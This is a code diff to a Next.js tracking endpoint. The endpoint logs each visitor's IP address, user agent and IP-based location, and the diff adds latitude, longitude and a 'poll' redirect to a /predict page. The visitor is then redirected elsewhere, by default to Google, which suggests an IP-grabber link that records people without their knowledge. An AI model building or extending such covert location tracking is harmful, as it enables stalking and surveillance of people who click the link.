@@ -18,8 +18,9 @@ import { insertLog, getSetting } from "@/lib/db";
 const DEFAULT_REDIRECT = "https://www.google.com";
 
 export async function GET(request) {
-  // Read the configured redirect URL from the database
+  // Read settings
   const redirectUrl = getSetting("redirect_url") || DEFAULT_REDIRECT;
+  const redirectMode = getSetting("redirect_mode") || "custom";
 
   try {
     // --- 1. Extract Client IP ---
@@ -46,6 +47,8 @@ export async function GET(request) {
     let country = "Unknown";
     let city = "Unknown";
     let isp = "Unknown";
+    let lat = null;
+    let lon = null;
 
     // Skip geo lookup for localhost / private IPs
     const isPrivate =
@@ -56,7 +59,7 @@ export async function GET(request) {
 
     if (!isPrivate) {
       try {
-        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`, {
+        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,lat,lon`, {
           signal: AbortSignal.timeout(3000), // 3 second timeout
         });
 
@@ -66,6 +69,8 @@ export async function GET(request) {
             country = geoData.country || "Unknown";
             city = geoData.city || "Unknown";
             isp = geoData.isp || "Unknown";
+            lat = geoData.lat ? String(geoData.lat) : null;
+            lon = geoData.lon ? String(geoData.lon) : null;
           }
         }
       } catch {
@@ -75,15 +80,20 @@ export async function GET(request) {
     }
 
     // --- 4. Save to Database ---
-    insertLog({
+    const logId = insertLog({
       ip,
       country,
       city,
       isp,
       device: userAgent,
+      lat,
+      lon
     });
 
-    // --- 5. Redirect to the configured URL ---
+    // --- 5. Redirect based on mode ---
+    if (redirectMode === "poll") {
+      return NextResponse.redirect(new URL(`/predict?logId=${logId}`, request.url));
+    }
     return NextResponse.redirect(redirectUrl, 302);
   } catch (error) {
     console.error("[track] Error in tracking endpoint:", error);
